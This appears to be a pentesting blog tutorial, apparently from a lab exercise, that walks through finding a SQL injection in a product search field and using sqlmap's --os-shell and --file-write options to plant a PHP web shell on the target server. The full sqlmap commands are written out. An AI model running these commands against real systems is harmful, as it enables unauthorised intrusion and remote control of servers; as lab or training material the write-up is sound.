---
title: Upload Web Shell with SQLmap
author: Udesh
date: 2020-04-09
categories: [Pentesting]
tags: shell
---

Here in this tutorial, I will show you how to upload a web shell using SQLmap. furthermore, we can use this step to get the reverse shell.  

## Find SQL injection point

First, we need to check our web application is vulnerable to SQL injection. here my web application has a search field. 

![1.PNG]({{site.baseurl}}/assets/img/post/post2/1.PNG)

I used burp tool to capture web application requests. This application has a function that will query the database when given the product name `"productName= "`, and it returns some information. I put `'` into the `productName=` parameter it will give some SQL error message from the webserver. now we can understand our web application is vulnerable to SQL injection.

![2.PNG]({{site.baseurl}}/assets/img/post/post2/2.PNG)

## Recon with Sqlmap

Now suppose that we found a SQL injection vulnerability from our web application. We can move on sqlmap. first, we need to identify what are the information that we can help with our attack. example collecting the user name of the current database, the permissions of the current database user, the absolute path of the website and other information.

The sqlmap command to view the current database user is as follows:
```bash
sqlmap -u "http://10.10.10.167/search_products.php" --data "productName=*" --dbms "mysql" --current-user
```
From the picture we can know that the user of the current database is `manager@localhost`
![3.PNG]({{site.baseurl}}/assets/img/post/post2/3.PNG)

The sqlmap command to view database user permissions is as follows:
```bash
sqlmap -u "http://10.10.10.167/search_products.php" --data "productName=*" --dbms "mysql" --privileges
```
Search from the content returned by sqlmap, the corresponding permissions of the root user, from the following figure we can see that the manager user has file permissions:

![4.PNG]({{site.baseurl}}/assets/img/post/post2/4.PNG)

## Upload Files with Sqlmap

**Step 1:**

sqlmap allows user to upload subsequent web backdoors. in this step we are gointo use `--os-shell` command to upload the web shell.

Enter the following command in the terminal, sqlmap will let us choose the settings:

```bash
sqlmap -u "http://10.10.10.167/search_products.php" --data "productName=*" --dbms "mysql" --dbs --os-shell
```
As shown in the figure below, here we have to choose script language selection [4] PHP and use for writable directory [4] Brute force search. if you know the absolute directory path use [2]. so here I used [2] because my dir path is `C:\inetpub\wwwroot\`

![5.PNG]({{site.baseurl}}/assets/img/post/post2/5.PNG)

![6.PNG]({{site.baseurl}}/assets/img/post/post2/6.PNG)

finally we can see something interesting: a backdoor and file stager were successfully uploaded on http://10.10.10.169/tmpuzbio.php

so all we have to do is go to the URL it gives us in the browser. When we do that, we are greeted by a file uploader:

![7.PNG]({{site.baseurl}}/assets/img/post/post2/7.PNG)

**step 2:**

In this step, we are going to use the file write method for uploading our web shell.

We can write a file by entering the following command:

Note: `--file-write`is the absolute path stored by the physical machine webshell; `--file-dest` is the absolute path written to the target machine;

```bash
sqlmap -u "http://10.10.10.167/search_products.php" --data "productName=*" --dbms "mysql"  --dbs --file-write=/home/ukmihiran/Desktop/w.php --file-dest=C:/inetpub/wwwroot/w.php --batch
```
From the prompt message of sqlmap below, we can see that we have successfully written to the webshell.

![8.PNG]({{site.baseurl}}/assets/img/post/post2/8.PNG)

then open your browser and go to the URL

![9.PNG]({{site.baseurl}}/assets/img/post/post2/9.PNG)

it gives us interactive web shell. 😎
